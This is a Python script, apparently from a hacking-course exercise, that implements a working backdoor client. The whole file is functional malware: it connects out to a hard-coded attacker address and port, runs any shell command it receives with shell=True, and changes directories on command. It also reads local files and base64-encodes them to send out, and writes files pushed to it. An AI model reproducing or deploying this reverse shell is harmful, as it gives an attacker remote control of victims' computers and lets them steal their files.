#!/usr/bin/env python
import socket
import subprocess
import json  # JSON Dumps & Loads takes str data type only
import os
import base64

# Edit the following variables accordingly :
# ----------------------------------------
ip = "192.168.83.166"
port = 9898
# ----------------------------------------


class Backdoor:
    def __init__(self, ip, port):
        """
        :param ip:
        :param port:
        """

        # (Address Family, Sock type)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, cmd):
        try:
            cmd = cmd.decode('utf-8')
            json_data = json.dumps(cmd)
        except AttributeError:
            json_data = json.dumps(cmd)

        self.connection.send(json_data.encode('utf-8'))

    def reliable_recv(self):
        json_r_data = ""
        while True:
            try:
                json_r_data = json_r_data + \
                    self.connection.recv(1024).decode('utf-8')
                # JSON takes str and converts(loads) back to its original structure(list)
                return json.loads(json_r_data)

            except json.decoder.JSONDecodeError:
                continue

    def sys_cmd(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return (f"Invalid Command: {command[0]}")

    def change_dir(self, path):
        try:
            os.chdir(path)
            return subprocess.check_output("cd", shell=True)
        except OSError:
            return (f"cd: no such directory: {path}")

    def read_file(self, filename):
        try:
            with open(filename, "rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return (f"Error: No such file: {filename}")

    def write_file(self, filename, content):  # Copy the contents of the download file
        content_list = content.split(" ")
        if not content_list[0] == "Error:":
            with open(filename, "wb") as file:
                # Converting content to bytes
                content = content.encode('utf-8')
                file.write(base64.b64decode(content))  # Decoding base64 format
                return (f"Successfully uploaded: {filename}")
        return content

    def start(self):
        while True:
            cmd = self.reliable_recv()

            if cmd[0] == "exit":
                self.connection.close()
                exit()
            elif cmd[0] == "cd" and len(cmd) > 1:
                result = self.change_dir(cmd[1])
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            else:
                result = self.sys_cmd(cmd)

            self.reliable_send(result)


my_backdoor = Backdoor(ip, port)
my_backdoor.start()
